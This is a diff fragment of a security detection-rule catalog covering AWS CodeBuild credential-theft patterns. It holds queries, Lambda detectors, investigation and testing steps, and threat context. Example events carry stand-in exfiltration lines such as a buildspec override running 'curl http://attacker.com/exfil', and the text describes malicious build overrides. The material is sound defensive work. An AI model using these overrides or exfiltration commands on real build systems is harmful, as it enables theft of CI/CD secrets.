+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because the recon-to-use window is short and actionable.",
+        considerations: ["This is the privileged-use branch of the Beanstalk recon family.", "Identity normalization and environment exposure context are the main dependencies."],
+      },
+    },
   },
 
   // --- CodeBuild Environment Credential Theft ---
   {
     id: "det-126",
     title: "CodeBuild StartBuild Visibility",
-    description: "Baseline visibility for build execution. Builds are normal, but StartBuild is a key entry point for abuse if an attacker can inject or override execution behavior.",
+    description: "Baseline visibility for CodeBuild execution requests. `StartBuild` is a sensitive launch point because it can run code under a build project's service role and secret access model.",
     awsService: "CodeBuild",
     relatedServices: ["IAM"],
     severity: "Medium",
@@ -13966,16 +16500,95 @@ ORDER BY eventTime DESC`,
 | filter eventName = "StartBuild"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
+      lambda: `"""
+CodeBuild StartBuild Visibility
+Trigger: EventBridge rule matching StartBuild.
+Use for: Baseline visibility into CodeBuild execution requests.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "codebuild.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "StartBuild":
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-126",
+            "title": "CodeBuild StartBuild Visibility",
+            "severity": "Medium",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "project_name": request.get("projectName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.projectName", "requestParameters.buildspecOverride", "requestParameters.environmentVariablesOverride", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { projectName: "my-project" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and project.", "Verify if build was authorized.", "Check for buildspecOverride or environmentVariablesOverride."],
-    testingSteps: ["Call StartBuild.", "Verify CloudTrail captures the event.", "Run the detection."],
+    investigationSteps: ["Identify the actor, project, and any request overrides associated with the build launch.", "Verify whether the build launch was expected for that actor and project.", "Check whether the same project or actor later accesses secrets, assumes roles, or performs unusual cloud actions."],
+    testingSteps: ["Call `StartBuild` against a test CodeBuild project.", "Verify CloudTrail captures the project and request context.", "Run the baseline rule and confirm it records all build launches."],
+    lifecycle: {
+      whyItMatters: "CodeBuild can execute code with high-value credentials, environment variables, and artifact access. Baseline visibility into build launches is essential for detecting build-path abuse.",
+      threatContext: {
+        attackerBehavior: "An attacker may trigger builds to execute under a privileged build role, access secrets, or stage malicious changes in CI/CD workflows.",
+        realWorldUsage: "This is attractive because build systems often have broad permissions and trusted network access.",
+        whyItMatters: "StartBuild is the feeder event for higher-confidence detections involving overrides, unexpected actors, and post-build sensitive activity.",
+        riskAndImpact: "If missed, defenders may not notice the beginning of CodeBuild-based credential theft or CI/CD abuse.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for CodeBuild"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.projectName", "requestParameters.buildspecOverride", "requestParameters.environmentVariablesOverride", "sourceIPAddress"],
+        loggingRequirements: ["CloudTrail must ingest CodeBuild management events.", "The platform should preserve project name and any request overrides.", "Follow-on IAM, STS, Secrets Manager, and KMS activity should be available for downstream correlation."],
+        limitations: ["A single StartBuild event is usually low-context by itself.", "High-volume CI/CD environments may produce a steady stream of expected build launches.", "The baseline does not prove whether the launched build was malicious."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor launching the build" },
+          { rawPath: "requestParameters.projectName", normalizedPath: "aws.codebuild.project.name", notes: "CodeBuild project started" },
+          { rawPath: "requestParameters.buildspecOverride", normalizedPath: "aws.codebuild.request.buildspec_override", notes: "Optional buildspec override" },
+          { rawPath: "requestParameters.environmentVariablesOverride", normalizedPath: "aws.codebuild.request.environment_variables_override", notes: "Optional environment variable override" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["process"], type: ["start"], action: "StartBuild", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/admin", type: "IAMUser" },
+          aws: { codebuild: { project: { name: "my-project" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Project Criticality", description: "Classify the build project by privilege, secret exposure, and production impact.", examples: ["deployment project", "test project"], falsePositiveReduction: "Improves prioritization of build launches." },
+        { dimension: "Actor Authorization", description: "Determine whether the actor is expected to start that build project.", examples: ["CI pipeline role", "unexpected app role"], falsePositiveReduction: "Feeds actor-based build detections." },
+        { dimension: "Override Presence", description: "Track whether buildspec or environment overrides were included in the request.", examples: ["no overrides", "buildspec override present"], falsePositiveReduction: "Helps separate ordinary builds from higher-risk launches." },
+      ],
+      logicExplanation: {
+        humanReadable: "This should remain a broad visibility rule for successful `StartBuild` events. It provides the baseline execution telemetry required for more targeted CodeBuild abuse detections.",
+        conditions: ["eventSource equals codebuild.amazonaws.com", "eventName equals StartBuild", "errorCode is absent"],
+        tuningGuidance: "1. Keep the baseline broad. 2. Add project criticality and actor context for triage. 3. Correlate with overrides or later sensitive activity for higher-confidence detections.",
+        whenToFire: "Fire on every successful StartBuild event for visibility.",
+      },
+      simulationCommand: "aws codebuild start-build --project-name my-project",
+      quality: {
+        signalQuality: 6,
+        falsePositiveRate: "Medium as a baseline visibility rule, low-medium with actor and project context",
+        expectedVolume: "Low-Medium depending on CI/CD usage",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful for chaining into override and post-build abuse detections.",
+        considerations: ["This is the feeder rule for the CodeBuild credential-theft family.", "Project criticality and actor context are the main enrichments."],
+      },
+    },
   },
   {
     id: "det-127",
     title: "StartBuild with Dangerous Overrides",
-    description: "Detects likely malicious manipulation of the build execution path. buildspecOverride and environmentVariablesOverride are unusually powerful and security-sensitive because they can change build commands and variable handling.",
+    description: "Detects high-risk CodeBuild launch modifications using `buildspecOverride` or `environmentVariablesOverride`. These parameters can materially change what the build executes or how secrets are exposed during runtime.",
     awsService: "CodeBuild",
     relatedServices: ["IAM"],
     severity: "High",
@@ -14012,16 +16625,98 @@ ORDER BY eventTime DESC`,
 | filter ispresent(requestParameters.buildspecOverride) or ispresent(requestParameters.environmentVariablesOverride)
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
+      lambda: `"""
+StartBuild with Dangerous Overrides
+Trigger: EventBridge rule matching StartBuild.
+Use for: Real-time detection of high-risk build launch overrides.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "codebuild.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "StartBuild":
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    if not (request.get("buildspecOverride") or request.get("environmentVariablesOverride")):
+        return {"matched": False}
+
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-127",
+            "title": "StartBuild with Dangerous Overrides",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "project_name": request.get("projectName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.projectName", "requestParameters.buildspecOverride", "requestParameters.environmentVariablesOverride", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { projectName: "target", buildspecOverride: "version: 0.2\nphases:\n  build:\n    commands:\n      - curl http://attacker.com/exfil" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and override content.", "Verify if override was authorized.", "Check for follow-on credential access by build role."],
-    testingSteps: ["StartBuild with buildspecOverride or environmentVariablesOverride.", "Verify detection triggers."],
+    investigationSteps: ["Inspect the exact override content, including buildspec commands and environment-variable changes.", "Verify whether the actor is allowed to launch builds with overrides on the target project.", "Check for follow-on secrets access, role assumption, decryption, or outbound access by the build role."],
+    testingSteps: ["Launch a test build using `buildspecOverride` or `environmentVariablesOverride`.", "Verify CloudTrail records the override fields.", "Run the detector and confirm it only fires when those override parameters are present."],
+    lifecycle: {
+      whyItMatters: "Override-based build launches are one of the most direct ways to weaponize CodeBuild. They can change commands, secret handling, and runtime behavior without altering the underlying project definition.",
+      threatContext: {
+        attackerBehavior: "An attacker may inject a malicious buildspec or override runtime variables to exfiltrate secrets, run arbitrary commands, or pivot into broader cloud access.",
+        realWorldUsage: "This is attractive because the override happens at execution time and can avoid more durable configuration changes.",
+        whyItMatters: "The presence of an override materially changes the risk of a build launch and deserves separate detection from the generic baseline.",
+        riskAndImpact: "If missed, defenders may overlook the exact moment a trusted CI/CD path was converted into arbitrary execution or secret exposure.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for CodeBuild"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.projectName", "requestParameters.buildspecOverride", "requestParameters.environmentVariablesOverride", "sourceIPAddress"],
+        loggingRequirements: ["CloudTrail must preserve the override fields in StartBuild requests.", "The environment should classify which projects or actors may legitimately use overrides.", "Follow-on build-role activity should be available for correlation."],
+        limitations: ["Some teams legitimately use overrides for testing or dynamic build control.", "CloudTrail may not fully capture the runtime impact of all override values.", "The override event alone does not confirm successful malicious execution."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.projectName", normalizedPath: "aws.codebuild.project.name", notes: "Project launched with overrides" },
+          { rawPath: "requestParameters.buildspecOverride", normalizedPath: "aws.codebuild.request.buildspec_override", notes: "Command path override" },
+          { rawPath: "requestParameters.environmentVariablesOverride", normalizedPath: "aws.codebuild.request.environment_variables_override", notes: "Runtime variable override" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor launching the risky build" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["process"], type: ["start"], action: "StartBuild", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { codebuild: { project: { name: "target" }, request: { buildspec_override: "version: 0.2\nphases:\n  build:\n    commands:\n      - curl http://attacker.example/exfil" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Override Authorization", description: "Determine whether the actor and project are allowed to use build overrides.", examples: ["approved test pipeline", "no override permissions"], falsePositiveReduction: "Separates expected engineering workflows from risky execution changes." },
+        { dimension: "Project Secret Exposure", description: "Classify what the project can access during runtime.", examples: ["deploy secrets", "artifact signing keys"], falsePositiveReduction: "Raises urgency when overrides land on highly privileged projects." },
+        { dimension: "Override Content Risk", description: "Inspect the override for outbound calls, secret handling, or arbitrary execution patterns.", examples: ["curl to external host", "sensitive env var overrides"], falsePositiveReduction: "Improves triage of genuinely dangerous overrides." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect `StartBuild` requests that include execution-changing overrides. It should treat `buildspecOverride` and `environmentVariablesOverride` as high-risk launch modifiers and then use project and actor context to determine urgency.",
+        conditions: ["eventSource equals codebuild.amazonaws.com", "eventName equals StartBuild", "requestParameters.buildspecOverride exists or requestParameters.environmentVariablesOverride exists"],
+        tuningGuidance: "1. Keep the override presence checks exact. 2. Classify which projects and actors may legitimately use overrides. 3. Escalate strongly when the override lands on a sensitive project or the content is clearly execution-changing.",
+        whenToFire: "Fire whenever StartBuild includes buildspec or environment-variable overrides.",
+      },
+      simulationCommand: "aws codebuild start-build --project-name target --buildspec-override file://override.yml",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with project and actor context",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is strongly preferred because override-backed builds can execute immediately.",
+        considerations: ["This is the dangerous-modifier branch of the CodeBuild family.", "Override authorization and content-risk analysis are the main enrichments."],
+      },
+    },
   },
   {
     id: "det-128",
-    title: "StartBuild by Unexpected Actor",
-    description: "Detects build execution initiated by identities that normally should not trigger builds or touch buildspec behavior. Suspicious: IAM users outside CI/CD engineering, application roles, unusual assumed roles.",
+    title: "StartBuild Outside Authorized CI/CD Access Path",
+    description: "Detects CodeBuild launches by identities outside approved CI/CD workflows. This should depend on explicit actor authorization and workflow provenance, not string matching on role names.",
     awsService: "CodeBuild",
     relatedServices: ["IAM"],
     severity: "High",
@@ -14037,44 +16732,107 @@ detection:
   selection:
     eventSource: codebuild.amazonaws.com
     eventName: StartBuild
-  filter_known:
-    userIdentity.arn|contains:
-      - 'codepipeline'
-      - 'codebuild'
-      - '/role/CI'
-      - '/role/DevOps'
-      - '/role/Platform'
-  condition: selection and not filter_known
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=codebuild.amazonaws.com eventName=StartBuild
-| where NOT (like(userIdentity.arn, "%codepipeline%") OR like(userIdentity.arn, "%codebuild%") OR like(userIdentity.arn, "%/role/CI%") OR like(userIdentity.arn, "%/role/DevOps%") OR like(userIdentity.arn, "%/role/Platform%"))
 | table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.projectName, sourceIPAddress`,
       cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.projectName, sourceIPAddress
 FROM cloudtrail_logs
 WHERE eventSource = 'codebuild.amazonaws.com'
   AND eventName = 'StartBuild'
-  AND userIdentity.arn NOT LIKE '%codepipeline%'
-  AND userIdentity.arn NOT LIKE '%codebuild%'
-  AND userIdentity.arn NOT LIKE '%/role/CI%'
-  AND userIdentity.arn NOT LIKE '%/role/DevOps%'
-  AND userIdentity.arn NOT LIKE '%/role/Platform%'
 ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.projectName
 | filter eventSource = "codebuild.amazonaws.com"
 | filter eventName = "StartBuild"
-| filter userIdentity.arn not like /codepipeline|codebuild|\\/role\\/(CI|DevOps|Platform)/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
+      lambda: `"""
+StartBuild Outside Authorized CI/CD Access Path
+Trigger: EventBridge rule matching StartBuild.
+Use for: Authorization checks on CodeBuild launches.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "codebuild.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "StartBuild":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-authorized-codebuild-starter-check",
+        "alert": {
+            "rule_id": "det-128",
+            "title": "StartBuild Outside Authorized CI/CD Access Path",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "project_name": detail.get("requestParameters", {}).get("projectName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.projectName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { projectName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for CodeBuild.", "Update allowlist if legitimate."],
-    testingSteps: ["As non-CI role, call StartBuild.", "Verify detection triggers."],
+    investigationSteps: ["Identify the actor, session issuer, and target project behind the build launch.", "Verify whether this identity is explicitly approved to start that project or invoke builds through a trusted workflow.", "Determine whether the request came from a known pipeline path or an unexpected manual or workload principal."],
+    testingSteps: ["As an identity outside the approved CodeBuild starter set, call `StartBuild` on a monitored project.", "Verify CloudTrail records the actor and project context.", "Run the detector and confirm it relies on explicit authorization rather than CI-related role-name fragments."],
+    lifecycle: {
+      whyItMatters: "Only a narrow set of pipeline and engineering identities should be able to launch sensitive builds. When an unapproved actor starts a build, it can provide immediate code-execution and secret-access opportunities.",
+      threatContext: {
+        attackerBehavior: "An attacker may trigger a privileged build from a compromised developer identity, app role, or unusual assumed role to reach CI/CD-held credentials and runtime access.",
+        realWorldUsage: "This is attractive because build systems often trust the launch request and execute under higher-privilege service roles.",
+        whyItMatters: "Actor authorization is the key question, not whether an ARN happens to contain CI or platform-like strings.",
+        riskAndImpact: "If missed, defenders may not recognize that an unauthorized principal has gained a direct path into privileged CI/CD execution.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for CodeBuild", "Authorized CodeBuild starter inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.projectName", "sourceIPAddress"],
+        loggingRequirements: ["StartBuild events must be ingested with full actor context.", "The environment should maintain exact principals or workflows authorized to launch each project.", "Trusted pipeline provenance should be modeled explicitly."],
+        limitations: ["Without authorization inventories the rule becomes a noisy anomaly detector.", "Some legitimate support or break-glass workflows may launch builds under non-obvious identities.", "The launch event alone does not prove the build executed malicious logic."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor launching the build" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "requestParameters.projectName", normalizedPath: "aws.codebuild.project.name", notes: "Project started outside approved access path" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["process"], type: ["start"], action: "StartBuild", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session", type: "AssumedRole" },
+          aws: { codebuild: { project: { name: "target" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Authorized Project Starters", description: "Exact inventory of actors or workflows allowed to start each project.", examples: ["CodePipeline role", "approved DevOps engineer"], falsePositiveReduction: "Replaces brittle role-name filtering." },
+        { dimension: "Workflow Provenance", description: "Determine whether the launch came through a trusted CI/CD path or an unexpected manual session.", examples: ["pipeline invocation", "interactive console session"], falsePositiveReduction: "Separates expected launches from suspicious ones." },
+        { dimension: "Project Privilege Level", description: "Classify the build project's secret access and downstream deployment power.", examples: ["prod deployment project", "low-risk lint project"], falsePositiveReduction: "Improves prioritization of unauthorized launches." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect `StartBuild` outside approved CI/CD access paths. It should match successful build launches and then check whether the actor and workflow provenance are explicitly authorized for the target project.",
+        conditions: ["eventSource equals codebuild.amazonaws.com", "eventName equals StartBuild", "actor is not in the approved starter inventory for the project or request lacks approved workflow provenance"],
+        tuningGuidance: "1. Use exact actor and project authorization inventories. 2. Model pipeline provenance separately from manual sessions. 3. Escalate strongly when the project is privileged or the actor is workload-derived.",
+        whenToFire: "Fire when a CodeBuild project is started by an identity outside approved access paths.",
+      },
+      simulationCommand: "aws codebuild start-build --project-name target --profile dev-user",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with project starter inventories and workflow provenance; high with name heuristics",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with actor inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because unauthorized build launches are immediately actionable.",
+        considerations: ["This is the actor-centric CodeBuild launch detector.", "Actor authorization and workflow provenance are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-129",
     title: "StartBuild with Overrides Followed by Sensitive IAM or Secrets Activity",
-    description: "High-confidence credential-theft: StartBuild with buildspecOverride and/or environmentVariablesOverride then shortly afterward CodeBuild service role or actor performs GetSecretValue, CreateAccessKey, AssumeRole, KMS Decrypt, or broad S3 access.",
+    description: "High-confidence CodeBuild abuse detection. This should correlate override-backed build launches with later sensitive IAM, STS, secrets, or decryption activity using ordered sequence and stable build identity linkage.",
     awsService: "CodeBuild",
     relatedServices: ["IAM", "STS", "Secrets Manager", "KMS", "S3"],
     severity: "Critical",
@@ -14096,9 +16854,9 @@ detection:
       - CreateAccessKey
       - AssumeRole
       - Decrypt
-  condition: 1 of selection_*
+  condition: selection_start
 level: critical
-# Full correlation (actor/build-role, 30 min) requires SIEM.`,
+# Full correlation requires ordered sequence and stable actor or build-role linkage.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=codebuild.amazonaws.com AND eventName=StartBuild) OR (eventName=GetSecretValue OR eventName=CreateAccessKey OR eventName=AssumeRole OR eventName=Decrypt))
 | eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
@@ -14132,16 +16890,99 @@ ORDER BY s.start_time DESC`,
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
+      lambda: `"""
+StartBuild with Overrides Followed by Sensitive IAM or Secrets Activity
+Trigger: EventBridge rule matching StartBuild.
+Use for: Correlation from risky build launch overrides into sensitive cloud activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "codebuild.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "StartBuild":
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    if not (request.get("buildspecOverride") or request.get("environmentVariablesOverride")):
+        return {"matched": False}
+
+    return {
+        "matched": "requires-codebuild-override-plus-sensitive-activity-correlation",
+        "alert": {
+            "rule_id": "det-129",
+            "title": "StartBuild with Overrides Followed by Sensitive IAM or Secrets Activity",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "project_name": request.get("projectName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.projectName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { projectName: "target", buildspecOverride: "malicious" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify StartBuild and sensitive API sequence.", "Verify if build role performed expected vs malicious API calls.", "Check buildspecOverride content."],
-    testingSteps: ["StartBuild with override, then have build role call GetSecretValue.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the override-backed build launch and the exact ordered sensitive actions that followed.", "Determine whether the later activity was performed by the initiating actor, the build service role, or another derived execution identity.", "Assess whether the override content plausibly enabled the observed secrets access, role assumption, or decryption."],
+    testingSteps: ["Launch a build with `buildspecOverride` or `environmentVariablesOverride`, then have the build or derived role perform `GetSecretValue`, `AssumeRole`, `Decrypt`, or `CreateAccessKey` within 30 minutes.", "Verify both the build launch and follow-on sensitive actions appear in CloudTrail.", "Run the detector and confirm it requires ordered sequence plus override presence."],
+    lifecycle: {
+      whyItMatters: "This is one of the highest-fidelity CodeBuild abuse patterns: an execution-changing build launch is followed by sensitive credential or secret activity soon afterward.",
+      threatContext: {
+        attackerBehavior: "An attacker may inject a malicious build launch and then use the build runtime or build role to access secrets, assume roles, decrypt protected data, or create new credentials.",
+        realWorldUsage: "This is attractive because it turns a trusted CI/CD path into a short-lived privileged execution environment.",
+        whyItMatters: "The ordered combination of risky launch override plus sensitive follow-on activity is much stronger than either event alone.",
+        riskAndImpact: "If missed, defenders may fail to connect build-path manipulation to the sensitive cloud actions it enabled.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for CodeBuild", "AWS CloudTrail management events for IAM, STS, Secrets Manager, and KMS"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.projectName", "requestParameters.buildspecOverride", "requestParameters.environmentVariablesOverride", "sourceIPAddress"],
+        loggingRequirements: ["Override-backed StartBuild events and follow-on sensitive events must be ingested into the same analytics environment.", "The detector should link the initiating actor to build-role activity where possible.", "The engine must support ordered time-window correlation."],
+        limitations: ["Direct actor-only joins may miss sensitive actions executed solely by the build role.", "Some legitimate builds intentionally access secrets or decrypt data.", "The model is strongest when project-role lineage is available."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.projectName", normalizedPath: "aws.codebuild.project.name", notes: "Project launched with risky overrides" },
+          { rawPath: "requestParameters.buildspecOverride", normalizedPath: "aws.codebuild.request.buildspec_override", notes: "Execution-changing build override" },
+          { rawPath: "requestParameters.environmentVariablesOverride", normalizedPath: "aws.codebuild.request.environment_variables_override", notes: "Runtime variable override" },
+          { rawPath: "follow_on.eventName", normalizedPath: "related.event.action", notes: "Sensitive action after the override-backed launch" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["process"], type: ["start"], action: "StartBuild", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { codebuild: { project: { name: "target" } } },
+          related: { event: { action: "GetSecretValue" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Build Role Lineage", description: "Resolve the project service role and any derived execution identity used after launch.", examples: ["same initiating actor", "CodeBuild project role"], falsePositiveReduction: "Improves correlation between launch and follow-on sensitive actions." },
+        { dimension: "Sensitive Action Class", description: "Classify the post-build action as secrets access, role assumption, decrypt, or credential creation.", examples: ["GetSecretValue", "AssumeRole"], falsePositiveReduction: "Makes the abuse path easier to triage." },
+        { dimension: "Override Content Risk", description: "Assess whether the launch override could plausibly drive the later sensitive activity.", examples: ["secret exfil command", "credential environment override"], falsePositiveReduction: "Raises confidence that the two stages are causally linked." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a CodeBuild abuse chain: a build is started with execution-changing overrides and sensitive cloud activity follows soon afterward from the same initiating context or linked build role. It should require event order and stable linkage across the two stages.",
+        conditions: ["first eventSource equals codebuild.amazonaws.com and eventName equals StartBuild with buildspecOverride or environmentVariablesOverride present", "second event is GetSecretValue, CreateAccessKey, AssumeRole, or Decrypt by the same normalized actor or linked build execution identity", "follow-on activity occurs within 30 minutes"],
+        tuningGuidance: "1. Require order. 2. Link initiator and build role where possible. 3. Escalate strongly when the project is privileged or the override content clearly enables the follow-on activity.",
+        whenToFire: "Fire when an override-backed build launch is followed quickly by sensitive credential, secrets, or decryption activity.",
+      },
+      simulationCommand: "aws codebuild start-build --project-name target --buildspec-override file://override.yml",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with build-role lineage and ordered correlation",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because the override-to-sensitive-activity chain is immediately actionable.",
+        considerations: ["This is the highest-fidelity CodeBuild credential-theft detector in the batch.", "Build-role lineage and override content context are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-130",
     title: "Rare or New Project Used for Build Trigger",
-    description: "Detects suspicious use of seldom-used or newly targeted projects. Attackers often pick a build project that already has privileged environment access but is not heavily monitored.",
+    description: "Detects first-seen or rare actor-to-project CodeBuild launches. Attackers may prefer dormant or unfamiliar projects that hold useful secrets or deployment power but draw less scrutiny.",
